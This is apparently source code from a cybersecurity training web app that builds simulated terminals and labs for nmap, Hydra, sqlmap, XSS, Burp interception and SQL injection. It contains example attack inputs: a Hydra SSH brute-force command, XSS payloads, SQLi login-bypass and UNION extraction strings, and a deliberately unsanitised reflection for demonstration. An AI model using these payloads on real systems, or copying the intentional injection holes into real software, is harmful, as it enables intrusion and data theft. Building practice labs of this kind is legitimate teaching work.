          <div id="nmapSimTerminal" class="terminal-window" style="height: 300px; display:flex; flex-direction:column; background:var(--bg-deep); padding:10px; border-radius:var(--radius); border:1px solid var(--border); font-family:var(--font-mono); font-size:13px; color:#a6accd; overflow-y:auto; margin-top:15px; position:relative;">
            <div id="nmapSimOutput" style="white-space:pre-wrap; margin-bottom:10px; line-height:1.5;">CyberCompanion Nmap Simulator v1.0.0<br>Ready.</div>
            <div style="display:flex; align-items:center;">
              <span style="color:var(--cyan); margin-right:8px;">[user@cyber-lab ~]$</span>
              <input type="text" id="nmapSimInput" class="nmap-tut-target" autocomplete="off" spellcheck="false" style="flex:1; background:transparent; border:none; color:#a6accd; font-family:var(--font-mono); font-size:13px; outline:none;" placeholder="Type an nmap command here...">
            </div>
          </div>
        </div>
      </div>
    `;
    
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', terminalHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', terminalHtml);
    }
    
    setTimeout(() => {
      const inputEl = document.getElementById('nmapSimInput');
      if (inputEl) {
        inputEl.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            const cmd = inputEl.value.trim();
            if (cmd) window.__app.handleNmapCommand(cmd);
            inputEl.value = '';
          }
        });
      }
    }, 100);
  }

  if (mod.id === 'hydra') {
    const terminalHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="hydraTerminalSection">
        <div class="section-header" style="background: rgba(236, 72, 153, 0.05); border-bottom: 1px solid rgba(236, 72, 153, 0.3);">
          <div class="section-icon concept">${LI.terminal}</div>
          <h3 class="section-title" style="color: #ec4899;">Interactive Hydra Terminal</h3>
        </div>
        <div class="section-body">
          <p>Practice running Hydra brute force commands in this simulated environment. Try commands like <code>hydra -l admin -P rockyou.txt ssh://192.168.1.1</code>.</p>
          <div id="hydraSimTerminal" class="terminal-window" style="height: 300px; display:flex; flex-direction:column; background:var(--bg-deep); padding:10px; border-radius:var(--radius); border:1px solid var(--border); font-family:var(--font-mono); font-size:13px; color:#a6accd; overflow-y:auto; margin-top:15px; position:relative;">
            <div id="hydraSimOutput" style="white-space:pre-wrap; margin-bottom:10px; line-height:1.5;">CyberCompanion Hydra Simulator v1.0.0
Hydra (THC) — Network Login Cracker
Ready. Type 'hydra' for usage help.</div>
            <div style="display:flex; align-items:center;">
              <span style="color:#ec4899; margin-right:8px;">[user@cyber-lab ~]$</span>
              <input type="text" id="hydraSimInput" class="hydra-tut-target" autocomplete="off" spellcheck="false" style="flex:1; background:transparent; border:none; color:#a6accd; font-family:var(--font-mono); font-size:13px; outline:none;" placeholder="Type a hydra command here...">
            </div>
          </div>
        </div>
      </div>
    `;
    
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', terminalHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', terminalHtml);
    }
    
    setTimeout(() => {
      const inputEl = document.getElementById('hydraSimInput');
      if (inputEl) {
        inputEl.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            const cmd = inputEl.value.trim();
            if (cmd) window.__app.handleHydraCommand(cmd);
            inputEl.value = '';
          }
        });
      }
    }, 100);
  }

  // ── SQLmap Simulator ─────────────────────────────────────────────────────────
  if (mod.id === 'sqlmap') {
    const terminalHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="sqlmapTerminalSection">
        <div class="section-header" style="background: rgba(251, 146, 60, 0.06); border-bottom: 1px solid rgba(251, 146, 60, 0.3);">
          <div class="section-icon concept">${LI.terminal}</div>
          <h3 class="section-title" style="color: #fb923c;">Interactive SQLmap Terminal</h3>
        </div>
        <div class="section-body">
          <p>Practice SQLmap commands in this simulated environment. Try <code>sqlmap -u "http://target.com/vuln?id=1" --dbs</code> or type <code>sqlmap --help</code> for a full reference.</p>
          <div id="sqlmapSimTerminal" class="terminal-window" style="height:340px; display:flex; flex-direction:column; background:var(--bg-deep); padding:10px; border-radius:var(--radius); border:1px solid rgba(251,146,60,0.3); font-family:var(--font-mono); font-size:12px; color:#a6accd; overflow-y:auto; margin-top:15px;">
            <div id="sqlmapSimOutput" style="white-space:pre-wrap; margin-bottom:10px; line-height:1.55; flex:1;">
<span style="color:#fb923c;">        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.7.12#stable}</span>\n|_ -| . [,]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\nCyberCompanion SQLmap Simulator v1.7\nType 'sqlmap --help' for usage, or start scanning.
            </div>
            <div style="display:flex; align-items:center; border-top:1px solid rgba(255,255,255,0.05); padding-top:8px; margin-top:4px;">
              <span style="color:#fb923c; margin-right:8px; white-space:nowrap;">[sqlmap]$</span>
              <input type="text" id="sqlmapSimInput" autocomplete="off" spellcheck="false" style="flex:1; background:transparent; border:none; color:#a6accd; font-family:var(--font-mono); font-size:12px; outline:none;" placeholder="Type a sqlmap command...">
            </div>
          </div>
        </div>
      </div>
    `;
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', terminalHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', terminalHtml);
    }
    setTimeout(() => {
      const inputEl = document.getElementById('sqlmapSimInput');
      if (inputEl) {
        inputEl.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            const cmd = inputEl.value.trim();
            if (cmd) window.__app.handleSqlmapCommand(cmd);
            inputEl.value = '';
          }
        });
      }
    }, 100);
  }

  // ── XSS Sandbox Simulator ────────────────────────────────────────────────────
  if (mod.id === 'xss') {
    const xssHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="xssLabSection">
        <div class="section-header" style="background: rgba(139, 92, 246, 0.06); border-bottom: 1px solid rgba(139, 92, 246, 0.3);">
          <div class="section-icon concept">${LI.flask}</div>
          <h3 class="section-title" style="color: #8b5cf6;">XSS Injection Sandbox</h3>
        </div>
        <div class="section-body">
          <p>A <strong>safe, isolated</strong> practice environment. Type an XSS payload below and click <strong>Inject</strong> to see it execute inside the simulated page. No Docker or lab required.</p>
          <div style="display:flex; gap:10px; margin-top:16px; align-items:stretch;">
            <div style="flex:1; display:flex; flex-direction:column; gap:10px;">
              <div style="background:var(--bg-deep); border:1px solid rgba(139,92,246,0.3); border-radius:var(--radius-sm); padding:12px;">
                <div style="font-size:11px; color:var(--text-muted); margin-bottom:8px; text-transform:uppercase; letter-spacing:1px;">Quick Payloads</div>
                <div style="display:flex; flex-wrap:wrap; gap:6px;">
                  <button class="xss-payload-btn" data-payload="&lt;script&gt;alert('XSS')&lt;/script&gt;" style="padding:4px 10px; font-size:11px; font-family:var(--font-mono); background:rgba(139,92,246,0.15); border:1px solid rgba(139,92,246,0.4); color:#a78bfa; border-radius:4px; cursor:pointer;">&lt;script&gt;alert()&lt;/script&gt;</button>
                  <button class="xss-payload-btn" data-payload="&lt;img src=x onerror=alert('IMG XSS')&gt;" style="padding:4px 10px; font-size:11px; font-family:var(--font-mono); background:rgba(139,92,246,0.15); border:1px solid rgba(139,92,246,0.4); color:#a78bfa; border-radius:4px; cursor:pointer;">&lt;img onerror&gt;</button>
                  <button class="xss-payload-btn" data-payload="&lt;svg onload=alert('SVG XSS')&gt;" style="padding:4px 10px; font-size:11px; font-family:var(--font-mono); background:rgba(139,92,246,0.15); border:1px solid rgba(139,92,246,0.4); color:#a78bfa; border-radius:4px; cursor:pointer;">&lt;svg onload&gt;</button>
                  <button class="xss-payload-btn" data-payload="&lt;iframe src=javascript:alert('iframe XSS')&gt;" style="padding:4px 10px; font-size:11px; font-family:var(--font-mono); background:rgba(139,92,246,0.15); border:1px solid rgba(139,92,246,0.4); color:#a78bfa; border-radius:4px; cursor:pointer;">&lt;iframe src=js:&gt;</button>
                  <button class="xss-payload-btn" data-payload="&lt;body onload=alert('Body XSS')&gt;" style="padding:4px 10px; font-size:11px; font-family:var(--font-mono); background:rgba(139,92,246,0.15); border:1px solid rgba(139,92,246,0.4); color:#a78bfa; border-radius:4px; cursor:pointer;">&lt;body onload&gt;</button>
                  <button class="xss-payload-btn" data-payload="&lt;script&gt;document.body.style.background='red'&lt;/script&gt;" style="padding:4px 10px; font-size:11px; font-family:var(--font-mono); background:rgba(139,92,246,0.15); border:1px solid rgba(139,92,246,0.4); color:#a78bfa; border-radius:4px; cursor:pointer;">Defacement</button>
                </div>
              </div>
              <div style="display:flex; gap:8px;">
                <input type="text" id="xssPayloadInput" placeholder="Type or paste your XSS payload here..." autocomplete="off" style="flex:1; background:var(--bg-deep); border:1px solid rgba(139,92,246,0.4); color:var(--text-primary); font-family:var(--font-mono); font-size:12px; padding:8px 12px; border-radius:var(--radius-sm); outline:none;">
                <button id="xssInjectBtn" style="padding:8px 20px; background:linear-gradient(135deg,#8b5cf6,#6d28d9); color:#fff; border:none; border-radius:var(--radius-sm); cursor:pointer; font-weight:700; font-size:13px; white-space:nowrap;">💉 Inject</button>
                <button id="xssClearBtn" style="padding:8px 14px; background:rgba(255,255,255,0.05); border:1px solid var(--border); color:var(--text-secondary); border-radius:var(--radius-sm); cursor:pointer; font-size:12px;">Clear</button>
              </div>
              <div id="xssResult" style="font-size:12px; padding:8px 12px; border-radius:var(--radius-sm); display:none;"></div>
            </div>
          </div>
          <div style="margin-top:12px; border:2px solid rgba(139,92,246,0.4); border-radius:var(--radius); overflow:hidden;">
            <div style="background:rgba(139,92,246,0.08); padding:8px 14px; display:flex; align-items:center; gap:8px; border-bottom:1px solid rgba(139,92,246,0.2);">
              <div style="display:flex;gap:6px;"><span style="width:12px;height:12px;background:#ff5f56;border-radius:50%;display:inline-block;"></span><span style="width:12px;height:12px;background:#ffbd2e;border-radius:50%;display:inline-block;"></span><span style="width:12px;height:12px;background:#27c93f;border-radius:50%;display:inline-block;"></span></div>
              <span style="font-size:11px; color:var(--text-muted); font-family:var(--font-mono);">VULNERABLE PAGE — http://simulated-target.local/search</span>
            </div>
            <iframe id="xssSandboxFrame" sandbox="allow-scripts allow-modals" style="width:100%; height:260px; border:none; background:#fff;" srcdoc="&lt;html&gt;&lt;body style='font-family:Arial,sans-serif; padding:20px; background:#f8f8f8;'&gt;&lt;h3 style='color:#333;'&gt;🛍️ VulnShop — Product Search&lt;/h3&gt;&lt;div style='background:#fff; border:1px solid #ddd; padding:10px; border-radius:4px;'&gt;&lt;input type='text' placeholder='Search products...' style='width:80%;padding:6px;border:1px solid #ccc;border-radius:3px;'&gt; &lt;button style='padding:6px 14px;background:#e74c3c;color:#fff;border:none;border-radius:3px;cursor:pointer;'&gt;Search&lt;/button&gt;&lt;/div&gt;&lt;p style='color:#777;font-size:13px;margin-top:10px;'&gt;Showing results for: &lt;span id='search-result'&gt;(nothing yet)&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;"></iframe>
          </div>
          <p style="font-size:11px; color:var(--text-muted); margin-top:8px;">Note: this sandbox uses a restricted iframe. Real payloads that steal cookies or make network requests won't work here (by design), but injection execution will be visible.</p>
        </div>
      </div>
    `;
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', xssHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', xssHtml);
    }
    setTimeout(() => {
      const payloadInput = document.getElementById('xssPayloadInput');
      const injectBtn = document.getElementById('xssInjectBtn');
      const clearBtn = document.getElementById('xssClearBtn');
      const frame = document.getElementById('xssSandboxFrame');
      const resultEl = document.getElementById('xssResult');

      // Quick payload buttons
      document.querySelectorAll('.xss-payload-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          if (payloadInput) payloadInput.value = btn.dataset.payload;
        });
      });

      function injectPayload() {
        const raw = payloadInput ? payloadInput.value.trim() : '';
        if (!raw) return;
        // Build a fresh srcdoc each time so payload is always injected fresh
        const safeSearchLabel = raw; // user-supplied, injected raw (that's the point!)
        const newDoc = `<html><head><style>body{font-family:Arial,sans-serif;padding:20px;background:#f8f8f8;}h3{color:#333;}input{width:80%;padding:6px;border:1px solid #ccc;border-radius:3px;}button{padding:6px 14px;background:#e74c3c;color:#fff;border:none;border-radius:3px;cursor:pointer;}.result-box{background:#fff;border:1px solid #ddd;padding:10px;border-radius:4px;margin-top:10px;}</style></head><body><h3>🛍️ VulnShop — Product Search</h3><div style="background:#fff;border:1px solid #ddd;padding:10px;border-radius:4px;"><input type='text' value="${raw.replace(/"/g,'&quot;')}" style='width:80%;padding:6px;border:1px solid #ccc;border-radius:3px;'> <button style='padding:6px 14px;background:#e74c3c;color:#fff;border:none;border-radius:3px;'>Search</button></div><div class='result-box'><p style='color:#777;font-size:13px;'>Showing results for: ${safeSearchLabel}</p></div></body></html>`;
        frame.srcdoc = newDoc;
        // Check if it looks like an XSS payload
        const isPayload = /<script|onerror|onload|javascript:|<svg|<iframe|<img/i.test(raw);
        resultEl.style.display = 'block';
        if (isPayload) {
          resultEl.style.background = 'rgba(239,68,68,0.1)';
          resultEl.style.border = '1px solid rgba(239,68,68,0.4)';
          resultEl.style.color = '#f87171';
          resultEl.innerHTML = '<strong>XSS Payload Detected!</strong> The application reflected your input without sanitization. In a real site, this would execute in every visitor\'s browser.';
        } else {
          resultEl.style.background = 'rgba(34,197,94,0.1)';
          resultEl.style.border = '1px solid rgba(34,197,94,0.4)';
          resultEl.style.color = '#4ade80';
          resultEl.innerHTML = 'Input reflected but <strong>no script injection detected</strong>. Try adding HTML tags like <code>&lt;script&gt;</code> or <code>onerror</code>.';
        }
      }

      if (injectBtn) injectBtn.addEventListener('click', injectPayload);
      if (payloadInput) payloadInput.addEventListener('keydown', e => { if (e.key === 'Enter') injectPayload(); });
      if (clearBtn) clearBtn.addEventListener('click', () => {
        if (payloadInput) payloadInput.value = '';
        resultEl.style.display = 'none';
        frame.srcdoc = "<html><body style='font-family:Arial,sans-serif;padding:20px;background:#f8f8f8;'><h3 style='color:#333;'>🛍️ VulnShop — Product Search</h3><div style='background:#fff;border:1px solid #ddd;padding:10px;border-radius:4px;'><input type='text' placeholder='Search products...' style='width:80%;padding:6px;border:1px solid #ccc;border-radius:3px;'> <button style='padding:6px 14px;background:#e74c3c;color:#fff;border:none;border-radius:3px;cursor:pointer;'>Search</button></div><p style='color:#777;font-size:13px;margin-top:10px;'>Showing results for: <span id='search-result'>(nothing yet)</span></p></body></html>";
      });
    }, 100);
  }

  // ── Burp Suite Interceptor Practice ─────────────────────────────────────────
  if (mod.id === 'burp-proxy') {
    const burpLabHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="burpLabSection">
        <div class="section-header" style="background: rgba(0,240,255,0.05); border-bottom: 1px solid var(--border-accent);">
          <div class="section-icon concept">${LI.shield}</div>
          <h3 class="section-title" style="color: var(--cyan);">Proxy Intercept Practice Lab</h3>
        </div>
        <div class="section-body">
          <p>Practice intercepting and modifying HTTP requests <strong>without needing Docker</strong>. Fill in the login form below and click Submit — the request will be intercepted by the Mini Proxy panel. Modify the payload and forward it to see the result.</p>
          <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-top:16px;">
            <!-- Simulated Login Page -->
            <div style="background:var(--bg-deep); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden;">
              <div style="background:rgba(0,0,0,0.3); padding:8px 14px; display:flex; align-items:center; gap:8px; border-bottom:1px solid var(--border);">
                <div style="display:flex;gap:5px;"><span style="width:10px;height:10px;background:#ff5f56;border-radius:50%;display:inline-block;"></span><span style="width:10px;height:10px;background:#ffbd2e;border-radius:50%;display:inline-block;"></span><span style="width:10px;height:10px;background:#27c93f;border-radius:50%;display:inline-block;"></span></div>
                <span style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono);">http://simulated-target.local/login</span>
              </div>
              <div style="padding:24px;">
                <h4 style="color:var(--text-primary); margin:0 0 16px 0;">Login</h4>
                <div style="display:flex; flex-direction:column; gap:10px;">
                  <input type="email" id="burpLabEmail" value="user@company.com" style="padding:8px 12px; background:rgba(255,255,255,0.05); border:1px solid var(--border); color:var(--text-primary); border-radius:4px; font-size:13px; font-family:var(--font-mono);">
                  <input type="password" id="burpLabPass" value="mypassword" style="padding:8px 12px; background:rgba(255,255,255,0.05); border:1px solid var(--border); color:var(--text-primary); border-radius:4px; font-size:13px; font-family:var(--font-mono);">
                  <button id="burpLabSubmit" style="padding:10px; background:linear-gradient(135deg,var(--cyan),var(--violet)); color:#000; font-weight:700; border:none; border-radius:4px; cursor:pointer; font-size:13px;">Submit (Intercept ON)</button>
                </div>
              </div>
            </div>
            <!-- Intercepted Request Display -->
            <div style="display:flex; flex-direction:column; gap:10px;">
              <div style="font-size:11px; color:var(--text-muted); text-transform:uppercase; letter-spacing:1px;">Intercepted Request</div>
              <textarea id="burpLabIntercepted" rows="8" spellcheck="false" style="width:100%; box-sizing:border-box; background:var(--bg-deep); border:1px solid var(--cyan); color:#a6accd; font-family:var(--font-mono); font-size:11px; padding:10px; border-radius:4px; resize:vertical; outline:none;">— Submit the form to intercept a request —</textarea>
              <div style="display:flex; gap:8px;">
                <button id="burpLabForward" style="flex:1; padding:8px; background:rgba(34,197,94,0.15); border:1px solid rgba(34,197,94,0.4); color:#4ade80; border-radius:4px; cursor:pointer; font-weight:700;">▶ Forward</button>
                <button id="burpLabDrop" style="flex:1; padding:8px; background:rgba(239,68,68,0.15); border:1px solid rgba(239,68,68,0.4); color:#f87171; border-radius:4px; cursor:pointer; font-weight:700;">✕ Drop</button>
              </div>
              <div id="burpLabResponse" style="display:none; padding:10px; border-radius:4px; font-size:12px; font-family:var(--font-mono);"></div>
            </div>
          </div>
          <div style="margin-top:14px; padding:10px 14px; background:rgba(0,240,255,0.05); border:1px solid rgba(0,240,255,0.2); border-radius:4px; font-size:12px; color:var(--text-secondary);">
            <strong>Try it:</strong> After intercepting, change the email to <code>admin@company.com'--</code> and click Forward. This simulates SQL Injection via Burp!
          </div>
        </div>
      </div>
    `;
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', burpLabHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', burpLabHtml);
    }
    setTimeout(() => {
      const submitBtn = document.getElementById('burpLabSubmit');
      const emailIn = document.getElementById('burpLabEmail');
      const passIn = document.getElementById('burpLabPass');
      const interceptedArea = document.getElementById('burpLabIntercepted');
      const forwardBtn = document.getElementById('burpLabForward');
      const dropBtn = document.getElementById('burpLabDrop');
      const responseEl = document.getElementById('burpLabResponse');

      if (submitBtn) submitBtn.addEventListener('click', () => {
        const email = emailIn ? emailIn.value : 'user@company.com';
        const pass = passIn ? passIn.value : 'mypassword';
        const raw = `POST /rest/user/login HTTP/1.1\nHost: simulated-target.local\nContent-Type: application/json\nContent-Length: ${JSON.stringify({email,password:pass}).length}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)\nCookie: token=abc123xyz\n\n${JSON.stringify({email, password: pass}, null, 2)}`;
        if (interceptedArea) interceptedArea.value = raw;
        if (responseEl) responseEl.style.display = 'none';
        submitBtn.textContent = 'Request Intercepted!';
        submitBtn.style.background = 'rgba(239,68,68,0.3)';
        setTimeout(() => { submitBtn.textContent = 'Submit (Intercept ON)'; submitBtn.style.background = 'linear-gradient(135deg,var(--cyan),var(--violet))'; }, 3000);
      });

      if (forwardBtn) forwardBtn.addEventListener('click', () => {
        const req = interceptedArea ? interceptedArea.value : '';
        const isSQLi = /['"-]{1,2}(--|#|;|or\s+1=1|union\s+select)/i.test(req);
        const isAdminEmail = /admin@/i.test(req);
        const priceMatch = req.match(/"price"\s*:\s*(-?\d+(?:\.\d+)?)/i);
        const isPriceTamper = priceMatch && parseFloat(priceMatch[1]) <= 0;
        const isXff = /^x-forwarded-for\s*:\s*127\.0\.0\.1\s*$/im.test(req);
        responseEl.style.display = 'block';
        if (isPriceTamper || isXff) {
          responseEl.style.background = 'rgba(239,68,68,0.1)';
          responseEl.style.border = '1px solid rgba(239,68,68,0.4)';
          responseEl.style.color = '#f87171';
          responseEl.innerHTML = isPriceTamper
            ? '<strong>HTTP/1.1 200 OK</strong><br>{ "order": "confirmed", "charged": ' + escapeHtml(priceMatch[1]) + ' }<br><br><em>The server trusted the client-supplied price.</em>'
            : '<strong>HTTP/1.1 200 OK</strong><br>{ "access": "granted", "ip_seen": "127.0.0.1" }<br><br><em>The server trusted the spoofed X-Forwarded-For header.</em>';
        } else if (isSQLi || isAdminEmail) {
          responseEl.style.background = 'rgba(239,68,68,0.1)';
          responseEl.style.border = '1px solid rgba(239,68,68,0.4)';
          responseEl.style.color = '#f87171';
          responseEl.innerHTML = '<strong>HTTP/1.1 200 OK</strong><br>{ "authentication": { "token": "eyJhbGciOiJSUzI1NiJ9...", "umail": "admin@company.com" } }<br><br><em>SQLi payload or admin account bypass accepted! You\'re in as admin.</em>';
        } else {
          responseEl.style.background = 'rgba(34,197,94,0.1)';
          responseEl.style.border = '1px solid rgba(34,197,94,0.4)';
          responseEl.style.color = '#4ade80';
          responseEl.innerHTML = '<strong>HTTP/1.1 401 Unauthorized</strong><br>{ "error": "Invalid email or password" }<br><br>Request forwarded normally. Try modifying the email with a SQLi payload!';
        }
      });

      if (dropBtn) dropBtn.addEventListener('click', () => {
        if (interceptedArea) interceptedArea.value = '— Request dropped. Submit again to intercept —';
        if (responseEl) responseEl.style.display = 'none';
      });
    }, 100);
  }

  // ── SQL Injection Practice Terminal ─────────────────────────────────────────
  if (mod.id === 'sqli') {
    const sqliLabHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="sqliLabSection">
        <div class="section-header" style="background: rgba(239,68,68,0.06); border-bottom: 1px solid rgba(239,68,68,0.3);">
          <div class="section-icon concept">${LI.target}</div>
          <h3 class="section-title" style="color: #ef4444;">SQLi Practice Lab — No Docker Required</h3>
        </div>
        <div class="section-body">
          <p>Test SQL injection payloads against a simulated login form. This lab works <strong>instantly</strong> — no lab setup needed. Observe how different payloads bypass or fail authentication.</p>
          <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-top:16px;">
            <div style="background:var(--bg-deep); border:1px solid rgba(239,68,68,0.3); border-radius:var(--radius); overflow:hidden;">
              <div style="background:rgba(0,0,0,0.3); padding:8px 14px; border-bottom:1px solid rgba(255,255,255,0.05);">
                <span style="font-size:10px; color:var(--text-muted); font-family:var(--font-mono);">SELECT * FROM users WHERE email='?' AND password='?'</span>
              </div>
              <div style="padding:20px; display:flex; flex-direction:column; gap:10px;">
                <div>
                  <label style="font-size:11px; color:var(--text-muted); display:block; margin-bottom:4px;">EMAIL / USERNAME</label>
                  <input type="text" id="sqliEmail" value="' OR 1=1--" style="width:100%;box-sizing:border-box;padding:8px 10px;background:rgba(255,255,255,0.05);border:1px solid rgba(239,68,68,0.4);color:var(--text-primary);border-radius:4px;font-family:var(--font-mono);font-size:12px;outline:none;">
                </div>
                <div>
                  <label style="font-size:11px; color:var(--text-muted); display:block; margin-bottom:4px;">PASSWORD</label>
                  <input type="text" id="sqliPass" value="anything" style="width:100%;box-sizing:border-box;padding:8px 10px;background:rgba(255,255,255,0.05);border:1px solid var(--border);color:var(--text-primary);border-radius:4px;font-family:var(--font-mono);font-size:12px;outline:none;">
                </div>
                <button id="sqliSubmit" style="padding:10px; background:linear-gradient(135deg,#ef4444,#b91c1c); color:#fff; font-weight:700; border:none; border-radius:4px; cursor:pointer;">Submit Injection</button>
              </div>
            </div>
            <div style="display:flex; flex-direction:column; gap:10px;">
              <div style="font-size:11px; color:var(--text-muted); text-transform:uppercase; letter-spacing:1px;">Server Response</div>
              <div id="sqliResponse" style="flex:1; background:var(--bg-deep); border:1px solid var(--border); border-radius:4px; padding:14px; font-family:var(--font-mono); font-size:12px; color:var(--text-secondary); min-height:120px;">Submit a payload to see the server's response...</div>
              <div style="font-size:11px; color:var(--text-muted); text-transform:uppercase; letter-spacing:1px;">Generated SQL</div>
              <div id="sqliGeneratedSQL" style="background:var(--bg-deep); border:1px solid var(--border); border-radius:4px; padding:10px; font-family:var(--font-mono); font-size:11px; color:#64748b; white-space:pre-wrap;">SELECT * FROM users WHERE email='?' AND password='?'</div>
            </div>
          </div>
          <div style="margin-top:14px; background:var(--bg-deep); border:1px solid var(--border); border-radius:4px; padding:12px;">
            <div style="font-size:11px; color:var(--text-muted); margin-bottom:8px;">COMMON PAYLOADS — Click to load:</div>
            <div style="display:flex; flex-wrap:wrap; gap:6px;">
              <button class="sqli-payload-btn" data-email="' OR 1=1--" data-pass="anything" style="padding:4px 10px;font-size:11px;font-family:var(--font-mono);background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);color:#f87171;border-radius:4px;cursor:pointer;">' OR 1=1--</button>
              <button class="sqli-payload-btn" data-email="admin@site.com'--" data-pass="anything" style="padding:4px 10px;font-size:11px;font-family:var(--font-mono);background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);color:#f87171;border-radius:4px;cursor:pointer;">admin'--</button>
              <button class="sqli-payload-btn" data-email="' UNION SELECT 1,username,password FROM users--" data-pass="x" style="padding:4px 10px;font-size:11px;font-family:var(--font-mono);background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);color:#f87171;border-radius:4px;cursor:pointer;">UNION SELECT</button>
              <button class="sqli-payload-btn" data-email="' OR 'a'='a" data-pass="' OR 'a'='a" style="padding:4px 10px;font-size:11px;font-family:var(--font-mono);background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);color:#f87171;border-radius:4px;cursor:pointer;">'OR'a'='a</button>
              <button class="sqli-payload-btn" data-email="normal@user.com" data-pass="correctpassword" style="padding:4px 10px;font-size:11px;font-family:var(--font-mono);background:rgba(34,197,94,0.1);border:1px solid rgba(34,197,94,0.3);color:#4ade80;border-radius:4px;cursor:pointer;">Valid Login</button>
            </div>
          </div>
          
          <div style="margin-top:20px; display:grid; grid-template-columns:1fr 1fr; gap:20px;">
            <div style="background:rgba(255,255,255,0.02); border:1px solid var(--border); border-radius:4px; padding:16px; border-left:3px solid #ef4444;">
              <h4 style="color:#e2e8f0; font-size:13px; margin-bottom:8px;">Step 1: Authentication Bypass</h4>
              <p style="font-size:12px; color:var(--text-muted); margin-bottom:8px; line-height:1.5;"><strong>Goal:</strong> Log in without knowing the password.</p>
              <ul style="font-size:12px; color:var(--text-secondary); padding-left:20px; line-height:1.5; margin-bottom:8px;">
                <li>Click the <span style="color:#ef4444; font-family:var(--font-mono);">' OR 1=1--</span> payload button above.</li>
                <li>Click <strong>Submit Injection</strong>.</li>
              </ul>
              <div style="background:rgba(239,68,68,0.05); padding:8px; border-radius:4px; font-size:11px; color:#f87171;">
                <strong>Why it works:</strong> The database evaluates <code style="font-family:var(--font-mono);">1=1</code> as TRUE, and the <code style="font-family:var(--font-mono);">--</code> comments out the password check!
              </div>
            </div>
            
            <div style="background:rgba(255,255,255,0.02); border:1px solid var(--border); border-radius:4px; padding:16px; border-left:3px solid #f59e0b;">
              <h4 style="color:#e2e8f0; font-size:13px; margin-bottom:8px;">Step 2: UNION Data Extraction</h4>
              <p style="font-size:12px; color:var(--text-muted); margin-bottom:8px; line-height:1.5;"><strong>Goal:</strong> Steal hidden data from the database.</p>
              <ul style="font-size:12px; color:var(--text-secondary); padding-left:20px; line-height:1.5; margin-bottom:8px;">
                <li>Click the <span style="color:#f59e0b; font-family:var(--font-mono);">UNION SELECT</span> payload button above.</li>
                <li>Click <strong>Submit Injection</strong>.</li>
              </ul>
              <div style="background:rgba(245,158,11,0.05); padding:8px; border-radius:4px; font-size:11px; color:#fbbf24;">
                <strong>Why it works:</strong> This appends a second query result to the first, pulling sensitive user data right into the server response.
              </div>
            </div>
          </div>
        </div>
      </div>
    `;
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', sqliLabHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', sqliLabHtml);
    }
    setTimeout(() => {
      const emailIn = document.getElementById('sqliEmail');
      const passIn = document.getElementById('sqliPass');
      const submitBtn = document.getElementById('sqliSubmit');
      const responseEl = document.getElementById('sqliResponse');
      const sqlEl = document.getElementById('sqliGeneratedSQL');

      document.querySelectorAll('.sqli-payload-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          if (emailIn) emailIn.value = btn.dataset.email;
          if (passIn) passIn.value = btn.dataset.pass;
        });
      });

      function evalSQLi() {
        const email = emailIn ? emailIn.value : '';
        const pass = passIn ? passIn.value : '';
        const generatedSQL = `SELECT * FROM users WHERE email='${email}' AND password='${pass}'`;
        if (sqlEl) sqlEl.textContent = generatedSQL;

        const isBypass = /'\s*(or|OR)\s+["']?1["']?\s*=\s*["']?1["']?/i.test(email + pass)
          || /(--|#)\s*$/.test(email)
          || /'\s*(or|OR)\s+'\w+'\s*=\s*'\w+/i.test(email + pass)
          || /union\s+select/i.test(email + pass);
        const isUnion = /union\s+select/i.test(email + pass);
        const isValid = email === 'normal@user.com' && pass === 'correctpassword';

        if (isUnion) {
          responseEl.style.background = 'rgba(251,146,60,0.1)';
          responseEl.style.border = '1px solid rgba(251,146,60,0.4)';
          responseEl.style.color = '#fb923c';
          responseEl.innerHTML = '<strong>UNION-based Injection Detected</strong><br><br>Database dump:<br>admin@site.com : $2b$12$hash1...<br>user@site.com : $2b$12$hash2...<br><br><em>All user records extracted!</em>';
        } else if (isBypass) {
          responseEl.style.background = 'rgba(239,68,68,0.1)';
